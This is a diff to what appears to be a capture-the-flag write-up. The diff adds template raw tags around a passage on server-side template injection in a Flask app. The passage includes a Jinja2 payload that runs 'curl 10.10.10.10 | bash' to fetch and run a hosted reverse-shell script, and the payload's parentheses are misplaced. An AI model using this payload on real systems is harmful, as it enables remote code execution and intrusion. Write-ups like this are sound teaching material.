@@ -49,7 +49,7 @@ def result():
     else:
         return "Wrong request method."
 ```
-
+{% raw %}
 In Flask, the `render_template` function allows us to evaluate expressions using the `{{ ... }}` syntax. For example, mathematical expressions such as `{{7*7}}` would be evaluated and would result in an output of `49`. We can use this technique to execute code using the Flask engine.
 
 We can create and image that simply says: `{{7*7}}`, and just as we thought, it gave us the following response, confirming the Server-Site Template Injection:
@@ -64,7 +64,7 @@ This required a lot of tinkering of the image to get the exploit to work. The OC
 ``` python
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen("curl 10.10.10.10 | bash".read() }}
 ```
-
+{% endraw %}
 ###### ***Note:*** I hosted a Reverse-Shell Bash script in an HTTP server so that it can pipe that over to `bash` after `curl`ing it.
 
 ***And, we're in!***
